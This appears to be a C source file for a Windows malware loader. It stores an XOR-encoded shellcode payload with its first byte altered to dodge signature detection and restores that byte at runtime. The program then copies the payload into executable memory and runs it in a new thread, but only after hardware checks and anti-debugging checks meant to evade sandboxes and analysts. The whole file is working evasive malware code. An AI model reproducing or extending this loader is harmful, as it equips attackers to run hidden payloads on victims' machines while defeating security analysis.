#include <Windows.h>
#include "AntiDebugging.h"
#include "CheckHardware.h"

void Run()
{
	unsigned char code[] =
		"\x00\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x88\x8b\xb0\xba\xac\x46\xa2\xd1\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x74\xc3\x33"
		"\x5e\x5c\xae\x6e\xd1\x88\x8b\xf1\xeb\xed\x16\xf0\x80\xc0"
		"\xba\x62\xec\xc9\x0e\x29\x83\xe8\xc3\x3b\xe8\xb4\x0e\x29"
		"\x83\xa8\xc6\x81\x73\xe4\x49\x15\x9b\xc2\xc3\x3b\xc8\xfc"
		"\x0e\x93\x11\x24\xb7\xd1\xc6\xae\x6a\x82\x90\x49\x42\xbd"
		"\xfb\xad\x87\x40\x3c\xda\xca\xe1\xf2\x27\x14\x82\x5a\xca"
		"\xb7\xf8\xbb\x7c\x20\x23\xa9\x90\x80\xb2\xb5\x29\x34\xa2"
		"\xd1\x88\x00\x30\x32\xac\x46\xa2\x99\x0d\x4b\xc4\xdd\xe4"
		"\x47\x72\x81\x03\xc3\xa8\xfe\x27\x06\x82\x98\x89\x5b\x53"
		"\xec\xe1\x77\x6b\x99\x77\x42\xf1\x31\x98\xce\xea\xd0\x5e"
		"\xc3\x81\x7a\xed\x87\x6b\xdc\x24\xca\xb1\x7b\x94\xa6\xd7"
		"\x20\xc4\x88\xfc\x9e\xa4\x03\x9b\x00\xfd\x53\xe8\xfe\x27"
		"\x06\x86\x98\x89\x5b\xd6\xfb\x27\x4a\xea\x95\x03\xcb\xac"
		"\xf3\xad\x96\xe3\x5a\x8c\x03\xf8\xbb\x7c\x07\xfa\x90\xd0"
		"\xd5\xe9\xe0\xed\x1e\xe3\x88\xc9\xd1\xf8\x39\x40\x66\xe3"
		"\x83\x77\x6b\xe8\xfb\xf5\x1c\xea\x5a\x9a\x62\xfb\x45\x53"
		"\xb9\xff\x98\x36\xfc\xc3\x88\xf3\x75\x90\xd1\x88\xca\xe6"
		"\xf3\x25\xa0\xea\x50\x64\x2b\xb1\xba\xac\x0f\x2b\x34\xc1"
		"\x37\xb2\xba\xbd\x1a\xa8\xc9\xa0\xe3\xf1\xee\xe5\xcf\x46"
		"\x9d\x01\x7a\xf1\x00\xe0\x31\x84\xd6\x77\x5e\xfc\x33\x46"
		"\x2e\xa3\xd0\x88\x8b\xe9\xfb\x16\x6f\x22\xba\x88\x74\x65"
		"\xd0\xa6\x07\xfc\x81\xd8\xc6\x81\x73\xe1\x77\x62\x99\x77"
		"\x4b\xf8\x33\x6e\x0e\x5d\x11\xc0\x02\x71\xfb\x16\xac\xad"
		"\x0e\x68\x74\x65\xf2\x25\x81\xc8\xc1\xc9\xd3\xfc\x33\x4e"
		"\x0e\x2b\x28\xc9\x31\x29\x1f\xd8\x27\x5d\x04\x0d\x4b\xc4"
		"\xb0\xe5\xb9\x6c\xa4\x6d\x63\x23\xba\xac\x46\xea\x52\x64"
		"\x9b\xf8\x33\x4e\x0b\x93\x18\xe2\x8f\xf1\xe2\xe4\xcf\x5b"
		"\x90\x32\x89\x69\x72\xf3\xb9\x77\x52\x70\x8b\xce\xef\xe4"
		"\xc5\x66\xf1\xd6\x02\x46\xd0\xec\x07\xfb\xb9\x88\x9b\xb0"
		"\xba\xed\x1e\xea\x58\x7a\xc3\x81\x73\xed\xfc\xfa\x75\xdb"
		"\x6e\x4f\x6f\xe4\xcf\x61\x98\x01\x4c\xfd\x8b\x65\x0f\x2b"
		"\x21\xc0\x02\x6a\xf2\x25\xbf\xe3\x6b\x8a\x52\x78\xe5\x53"
		"\x93\x21\x29\x88\xf6\x98\xe2\xed\x11\xfb\xb9\x88\xcb\xb0"
		"\xba\xed\x1e\xc8\xd1\xd2\xca\x0a\xb1\x83\x49\x92\x2e\x5d"
		"\xdc\xe9\xfb\x16\x33\xcc\x9c\xe9\x74\x65\xf3\x53\x88\x4b"
		"\xed\x77\x74\x4f\xf2\xad\x85\xea\xf8\x4e\xc3\x35\x4c\xd9"
		"\xf2\xe3\x2e\x6f\xd3\xda\xba\xf5\x0f\x65\x13\x78\x3e\x12"
		"\xec\x53\x93\xa2\xd1";

	char first[] = "\x48"; // correct value

	PVOID pCode = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(code, first, sizeof first);
	RtlCopyMemory(pCode, code, sizeof code);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)pCode, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}

void ShowMessageBox(LPCSTR text)
{
	//MessageBoxA(0, text, "STOPPED", MB_OK);
}

int main()
{
	if (!SystemHasSufficientHardware())
	{
		//ShowMessageBox("CPU/RAM/HDD check failed!");
		return 0;
	}

	if (!checkAntiDebugging())
	{
		//ShowMessageBox("Anti-debugging check failed!");
		return 0;
	}

	Run();
	return 0;
}